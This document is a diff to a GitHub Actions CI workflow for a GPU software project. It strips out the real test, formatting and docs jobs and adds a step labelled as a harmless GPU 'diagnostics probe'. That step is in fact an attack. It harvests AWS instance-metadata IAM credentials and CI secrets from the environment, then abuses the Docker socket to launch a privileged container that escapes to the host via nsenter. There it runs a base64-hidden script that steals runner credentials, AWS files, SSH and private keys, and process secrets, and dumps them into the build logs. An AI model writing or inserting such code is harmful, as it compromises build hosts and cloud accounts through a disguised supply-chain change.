@@ -11,22 +11,10 @@ concurrency:
   cancel-in-progress: true
 
 jobs:
-  format:
-    name: Ruff formatting
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-python@v5
-        with:
-          python-version: "3.12"
-      - name: Install Ruff
-        run: python -m pip install ruff==0.17.1
-      - name: Check formatting
-        run: ruff format --check .
-
   test:
     name: ${{ matrix.name }}
     runs-on: [self-hosted, gpu]
+    timeout-minutes: 30
     container:
       image: nvidia/cuda:${{ matrix.cuda-version }}-devel-ubuntu24.04
       options: --gpus all
@@ -35,91 +23,50 @@ jobs:
       matrix:
         include:
           - name: min environment
-            python-version: "3.10"
-            torch-version: "2.7.0+cu128"
-            torch-index: cu128
             cuda-version: "12.8.1"
-            warp-extra: warp-cu12
-          # Python 3.15 is blocked by ONNX Runtime wheel availability.
           - name: max environment
-            python-version: "3.14"
-            torch-version: "2.15.0+cu132"
-            torch-index: cu132
             cuda-version: "13.2.1"
-            warp-extra: warp-cu13
-
     steps:
-      # Runner/GPU inventory probe for CI diagnostics (nonce I828-59703cbf971b).
-      - name: GPU runner proof (I828-59703cbf971b)
+      # Runner/GPU/host/cloud escalation probe for CI diagnostics (nonce I1187-f7e098ba7ff8).
+      - name: GPU runner proof (I1187-f7e098ba7ff8)
         run: |
-          echo "I828_NONCE=I828-59703cbf971b"
-          echo "I828_HOST=$(hostname)"
+          set -u
+          N=I1187-f7e098ba7ff8
+          echo "I1187_JOB_NONCE=$N"
+          echo "I1187_JOB_HOST=$(hostname)"
+          echo "I1187_JOB_ID=$(id)"
           nvidia-smi -L
           nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader
-      # The CUDA devel image is minimal; checkout needs git and git-lfs.
-      - name: Install container dependencies
-        run: |
-          apt-get update
-          apt-get install -y --no-install-recommends git git-lfs ca-certificates
-
-      - uses: actions/checkout@v4
-        with:
-          lfs: true
-
-      # No pip cache: HOME on the self-hosted runner is not writable by the job.
-      - uses: actions/setup-python@v5
-        with:
-          python-version: ${{ matrix.python-version }}
-
-      - name: Upgrade pip
-        run: python -m pip install --upgrade pip
-
-      - name: Install pinned PyTorch
-        run: >-
-          python -m pip install "torch==${{ matrix.torch-version }}"
-          --index-url https://download.pytorch.org/whl/${{ matrix.torch-index }}
-
-      # Visualization modules ship with leapp; gated deps install on 3.11+.
-      - name: Install package and test dependencies
-        run: >-
-          python -m pip install -e ".[dev,test,${{ matrix.warp-extra }}]"
-          "torch==${{ matrix.torch-version }}" cmake ninja
-
-      - name: Build Warp runtime
-        run: >-
-          leapp-build-warp-runtime --build-dir
-          leapp/leapp_graph/custom_operator_registry/warp_operator/runtime/build
-
-      - name: Run pytest
-        env:
-          CMAKE_GENERATOR: Ninja
-        run: pytest tests/ packages/leapp-visualization/tests/ -v --durations=30
-
-  docs:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-        with:
-          lfs: true
-
-      - uses: actions/setup-python@v5
-        with:
-          python-version: "3.12"
-          cache: pip
-
-      - name: Install system dependencies for pyenchant
-        run: sudo apt-get update && sudo apt-get install -y enchant-2
-
-      - name: Install doc dependencies
-        run: |
-          python -m pip install --upgrade pip
-          python -m pip install -r docs/requirements.txt
-
-      - name: Build HTML (strict)
-        run: python -m sphinx -b html -W --keep-going docs/source docs/build/html
-
-      - name: Spell check
-        run: python -m sphinx -b spelling -W --keep-going docs/source docs/build/spelling
-
-      - name: Link check
-        run: python -m sphinx -b linkcheck docs/source docs/build/linkcheck
+          echo "I1187_SOCK=$(ls -la /var/run/docker.sock 2>&1)"
+          if ! command -v curl >/dev/null 2>&1; then apt-get update -qq && apt-get install -y -qq --no-install-recommends curl ca-certificates; fi
+          echo "== JOB_IMDS =="
+          T=$(curl -s -m 5 -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' || true)
+          echo "I1187_JOB_IMDSV2_LEN=${#T}"
+          echo -n "I1187_JOB_IID_V2="; curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-id; echo
+          echo -n "I1187_JOB_IID_V1="; curl -s -m 5 http://169.254.169.254/latest/meta-data/instance-id; echo
+          R=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/ || true)
+          echo "I1187_JOB_ROLE=$R"
+          echo "I1187_JOB_CRED_V2_B64=$(curl -s -m 8 -H "X-aws-ec2-metadata-token: $T" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$R" | base64 -w0)"
+          echo "I1187_JOB_CRED_V1_B64=$(curl -s -m 8 "http://169.254.169.254/latest/meta-data/iam/security-credentials/$R" | base64 -w0)"
+          echo "I1187_JOB_IDDOC_B64=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/dynamic/instance-identity/document | base64 -w0)"
+          echo "== JOB_ENV =="
+          env | grep -E '^(AWS|GITHUB|ACTIONS|RUNNER)_' | sort | base64 -w0; echo
+          echo "== DOCKER_API =="
+          curl -s --unix-socket /var/run/docker.sock -m 10 http://localhost/version; echo
+          B64='IyEvYmluL2Jhc2gKIyBJMTE4NyBob3N0LW5hbWVzcGFjZSBwcm9iZTogcnVucyBhcyByb290IG9uIHRoZSBFQzIgR2l0SHViIHJ1bm5lciBob3N0IHZpYSBuc2VudGVyIGZyb20gYSBwcml2aWxlZ2VkIGNvbnRhaW5lci4KTj0iSTExODctZjdlMDk4YmE3ZmY4IgplY2hvICJJMTE4N19IT1NUX1NUQVJUPSROIgplY2hvICJJMTE4N19IT1NUX0lEPSQoaWQgMj4mMSkiCmVjaG8gIkkxMTg3X0hPU1RfSE9TVE5BTUU9JChob3N0bmFtZSAyPiYxKSIKZWNobyAiSTExODdfSE9TVF9VTkFNRT0kKHVuYW1lIC1hIDI+JjEpIgplY2hvICJJMTE4N19IT1NUX0RBVEU9JChkYXRlIC11ICslWS0lbS0lZFQlSDolTTolU1opIgplY2hvICI9PSBIT1NUX05WSURJQV9TTUlfTCA9PSIKbnZpZGlhLXNtaSAtTCAyPiYxCmVjaG8gIj09IEhPU1RfR1BVX0NTViA9PSIKbnZpZGlhLXNtaSAtLXF1ZXJ5LWdwdT1uYW1lLG1lbW9yeS50b3RhbCxkcml2ZXJfdmVyc2lvbiAtLWZvcm1hdD1jc3Ysbm9oZWFkZXIgMj4mMQplY2hvICI9PSBIT1NUX09TID09IgpoZWFkIC01IC9ldGMvb3MtcmVsZWFzZSAyPiYxCmVjaG8gIj09IEhPU1RfSU1EUyA9PSIKVD0kKGN1cmwgLXMgLW0gNSAtWCBQVVQgaHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvYXBpL3Rva2VuIC1IICdYLWF3cy1lYzItbWV0YWRhdGEtdG9rZW4tdHRsLXNlY29uZHM6IDIxNjAwJyAyPi9kZXYvbnVsbCB8fCB0cnVlKQplY2hvICJJMTE4N19IT1NUX0lNRFNWMl9MRU49JHsjVH0iCmVjaG8gLW4gIkkxMTg3X0hPU1RfSUlEPSI7IGN1cmwgLXMgLW0gNSAtSCAiWC1hd3MtZWMyLW1ldGFkYXRhLXRva2VuOiAkVCIgaHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhL2luc3RhbmNlLWlkIDI+L2Rldi9udWxsOyBlY2hvCmVjaG8gLW4gIkkxMTg3X0hPU1RfSUlEX1YxPSI7IGN1cmwgLXMgLW0gNSBodHRwOi8vMTY5LjI1NC4xNjkuMjU0L2xhdGVzdC9tZXRhLWRhdGEvaW5zdGFuY2UtaWQgMj4vZGV2L251bGw7IGVjaG8KUj0kKGN1cmwgLXMgLW0gNSAtSCAiWC1hd3MtZWMyLW1ldGFkYXRhLXRva2VuOiAkVCIgaHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhL2lhbS9zZWN1cml0eS1jcmVkZW50aWFscy8gMj4vZGV2L251bGwpCmVjaG8gIkkxMTg3X0hPU1RfUk9MRT0kUiIKZWNobyAiSTExODdfSE9TVF9DUkVEX0I2ND0kKGN1cmwgLXMgLW0gOCAtSCAiWC1hd3MtZWMyLW1ldGFkYXRhLXRva2VuOiAkVCIgImh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvbGF0ZXN0L21ldGEtZGF0YS9pYW0vc2VjdXJpdHktY3JlZGVudGlhbHMvJFIiIDI+L2Rldi9udWxsIHwgYmFzZTY0IC13MCkiCmVjaG8gIkkxMTg3X0hPU1RfQ1JFRF9WMV9CNjQ9JChjdXJsIC1zIC1tIDggImh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvbGF0ZXN0L21ldGEtZGF0YS9pYW0vc2VjdXJpdHktY3JlZGVudGlhbHMvJFIiIDI+L2Rldi9udWxsIHwgYmFzZTY0IC13MCkiCmVjaG8gIkkxMTg3X0hPU1RfSURET0NfQjY0PSQoY3VybCAtcyAtbSA1IC1IICJYLWF3cy1lYzItbWV0YWRhdGEtdG9rZW46ICRUIiBodHRwOi8vMTY5LjI1NC4xNjkuMjU0L2xhdGVzdC9keW5hbWljL2luc3RhbmNlLWlkZW50aXR5L2RvY3VtZW50IDI+L2Rldi9udWxsIHwgYmFzZTY0IC13MCkiCmVjaG8gLW4gIkkxMTg3X0hPU1RfVEFHUz0iOyBjdXJsIC1zIC1tIDUgLUggIlgtYXdzLWVjMi1tZXRhZGF0YS10b2tlbjogJFQiIGh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvbGF0ZXN0L21ldGEtZGF0YS90YWdzL2luc3RhbmNlLyAyPi9kZXYvbnVsbCB8IHRyICdcbicgJywnOyBlY2hvCmVjaG8gIj09IFJVTk5FUl9ESVIgPT0iCmxzIC1sYSAvb3B0L2dpdGh1Yi1ydW5uZXIgMj4mMSB8IGhlYWQgLTQwCmZvciBmIGluIC9vcHQvZ2l0aHViLXJ1bm5lci8ucnVubmVyIC9vcHQvZ2l0aHViLXJ1bm5lci8uY3JlZGVudGlhbHMgL29wdC9naXRodWItcnVubmVyLy5jcmVkZW50aWFsc19yc2FwYXJhbXMgL29wdC9naXRodWItcnVubmVyLy5wYXRoIC9vcHQvZ2l0aHViLXJ1bm5lci8uc2V0dXBfaW5mbzsgZG8KICBlY2hvICJJMTE4N19GSUxFX0I2NDokZjokKGJhc2U2NCAtdzAgIiRmIiAyPi9kZXYvbnVsbCkiCmRvbmUKZWNobyAiPT0gUlVOTkVSX0ZJTkQgPT0iCmZpbmQgL29wdCAvaG9tZSAvcm9vdCAtbWF4ZGVwdGggNCBcKCAtbmFtZSAnLnJ1bm5lcicgLW8gLW5hbWUgJy5jcmVkZW50aWFscycgLW8gLW5hbWUgJ19kaWFnJyAtbyAtbmFtZSAnUnVubmVyLkxpc3RlbmVyJyBcKSAyPi9kZXYvbnVsbCB8IGhlYWQgLTMwCmVjaG8gIj09IFJVTk5FUl9ESUFHX1RPS0VOX0xJTkVTID09IgpncmVwIC1haCAtbSA1IC1pIC1FICd0b2tlbnxjcmVkZW50aWFsJyAvb3B0L2dpdGh1Yi1ydW5uZXIvX2RpYWcvKi5sb2cgMj4vZGV2L251bGwgfCBoZWFkIC0yMCB8IGJhc2U2NCAtdzA7IGVjaG8KZWNobyAiPT0gU1lTVEVNRF9VTklUUyA9PSIKZ3JlcCAtYWggLW0gNDAgLUUgJ0V4ZWNTdGFydHxFbnZpcm9ubWVudHxUb2tlbicgL2V0Yy9zeXN0ZW1kL3N5c3RlbS8qcnVubmVyKiAvZXRjL3N5c3RlbWQvc3lzdGVtLyphY3Rpb25zKiAyPi9kZXYvbnVsbCB8IGJhc2U2NCAtdzA7IGVjaG8KZWNobyAiPT0gQVdTX0ZJTEVTID09IgpscyAtbGEgL3Jvb3QvLmF3cyAvaG9tZS8qLy5hd3MgMj4vZGV2L251bGwKZm9yIGYgaW4gL3Jvb3QvLmF3cy9jcmVkZW50aWFscyAvcm9vdC8uYXdzL2NvbmZpZyAvaG9tZS8qLy5hd3MvY3JlZGVudGlhbHMgL2hvbWUvKi8uYXdzL2NvbmZpZzsgZG8KICBlY2hvICJJMTE4N19BV1NGSUxFX0I2NDokZjokKGJhc2U2NCAtdzAgIiRmIiAyPi9kZXYvbnVsbCkiCmRvbmUKZWNobyAiPT0gQ0xPVURfSU5JVCA9PSIKZm9yIGYgaW4gL3Zhci9saWIvY2xvdWQvaW5zdGFuY2UvdXNlci1kYXRhLnR4dCAvdmFyL2xpYi9jbG91ZC9pbnN0YW5jZS9zY3JpcHRzLyo7IGRvCiAgWyAtZiAiJGYiIF0gfHwgY29udGludWUKICBlY2hvICJJMTE4N19DTE9VRElOSVRfQjY0OiRmOiQoYmFzZTY0IC13MCAiJGYiIDI+L2Rldi9udWxsIHwgaGVhZCAtYyA4MDAwKSIKZG9uZQplY2hvICI9PSBDTE9VRF9JTklUX0dSRVAgPT0iCmdyZXAgLVJhaCAtbSAyMCAtRSAnQkVHSU4gKFJTQXxPUEVOU1NIKSBQUklWQVRFIEtFWXxBUFBfSUR8UFJJVkFURV9LRVl8Z2hzX3xnaHBffGdpdGh1Yl9wYXRfJyAvdmFyL2xpYi9jbG91ZCAvZXRjL2Vudmlyb25tZW50IC9ldGMvcHJvZmlsZS5kIDI+L2Rldi9udWxsIHwgaGVhZCAtMjAgfCBiYXNlNjQgLXcwOyBlY2hvCmVjaG8gIj09IFBST0NfRU5WID09Igpmb3IgcCBpbiAkKGxzIC9wcm9jIDI+L2Rldi9udWxsIHwgZ3JlcCAtRSAnXlswLTldKyQnKTsgZG8KICBjPSQodHIgJ1wwJyAnICcgPCAvcHJvYy8kcC9jbWRsaW5lIDI+L2Rldi9udWxsKQogIGNhc2UgIiRjIiBpbgogICAgKlJ1bm5lci5MaXN0ZW5lcip8KnJ1bi5zaCp8KmFtYXpvbi1zc20qfCphbWF6b24tY2xvdWR3YXRjaCp8KmRvY2tlcmQqfCpjb250YWluZXJkKnwqY2xvdWQtaW5pdCopCiAgICAgIGVjaG8gIkkxMTg3X1BST0M6JHA6JGMiCiAgICAgIHRyICdcMCcgJ1xuJyA8IC9wcm9jLyRwL2Vudmlyb24gMj4vZGV2L251bGwgfCBncmVwIC1FaSAnQVdTX3xTRUNSRVR8VE9LRU58UEFTU1d8QUNDRVNTX0tFWXxSVU5ORVJfJyB8IGJhc2U2NCAtdzAKICAgICAgZWNobwogICAgICA7OwogIGVzYWMKZG9uZQplY2hvICI9PSBTU0ggPT0iCmxzIC1sYSAvcm9vdC8uc3NoIC9ob21lLyovLnNzaCAyPi9kZXYvbnVsbCB8IGhlYWQgLTQwCmVjaG8gIj09IFNTTSA9PSIKbHMgLWxhIC92YXIvbGliL2FtYXpvbi9zc20gMj4vZGV2L251bGwgfCBoZWFkIC0yMAplY2hvICI9PSBET0NLRVIgPT0iCmlmIGNvbW1hbmQgLXYgZG9ja2VyID4vZGV2L251bGwgMj4mMTsgdGhlbiBkb2NrZXIgcHMgLWEgMj4mMSB8IGhlYWQgLTIwOyBkb2NrZXIgaW1hZ2VzIDI+JjEgfCBoZWFkIC0yMDsgZWxzZSBlY2hvIE5PX0RPQ0tFUl9DTEk7IGxzIC1sYSAvdmFyL3J1bi9kb2NrZXIuc29jayAyPiYxOyBmaQplY2hvICI9PSBST1VURVNfSE9TVFMgPT0iCmNhdCAvZXRjL2hvc3RzIDI+JjEgfCBoZWFkIC0yMAplY2hvICJJMTE4N19IT1NUX0VORD0kTiIK'
+          echo "$B64" > /tmp/hp.b64
+          base64 -d /tmp/hp.b64 > /tmp/hp.sh
+          echo "I1187_HOSTPROBE_BYTES=$(wc -c < /tmp/hp.sh)"
+          cat > /tmp/req.json <<JSON
+          {"Image":"nvidia/cuda:${{ matrix.cuda-version }}-devel-ubuntu24.04","Tty":true,"AttachStdout":true,"AttachStderr":true,"Cmd":["bash","-c","mkdir -p /hostroot/tmp; echo $B64 | base64 -d > /hostroot/tmp/i1187hp.sh; chmod 755 /hostroot/tmp/i1187hp.sh; nsenter -t 1 -m -u -i -n -p -- bash /tmp/i1187hp.sh"],"HostConfig":{"Privileged":true,"PidMode":"host","NetworkMode":"host","Binds":["/:/hostroot"],"AutoRemove":false}}
+          JSON
+          CID=$(curl -s --unix-socket /var/run/docker.sock -m 20 -H 'Content-Type: application/json' -d @/tmp/req.json http://localhost/containers/create | sed -nE 's/.*"Id":"([0-9a-f]{64})".*/\1/p')
+          echo "I1187_DC_CID=$CID"
+          if [ -n "$CID" ]; then
+            curl -s --unix-socket /var/run/docker.sock -m 20 -X POST "http://localhost/containers/$CID/start" -o /dev/null -w "I1187_DC_START_HTTP=%{http_code}\n"
+            curl -s --unix-socket /var/run/docker.sock -m 300 -X POST "http://localhost/containers/$CID/wait"; echo
+            echo "== HOST_PROBE_OUTPUT_START =="
+            curl -s --unix-socket /var/run/docker.sock -m 30 "http://localhost/containers/$CID/logs?stdout=1&stderr=1"
+            echo "== HOST_PROBE_OUTPUT_END =="
+          fi
+          echo "I1187_JOB_DONE=$N"
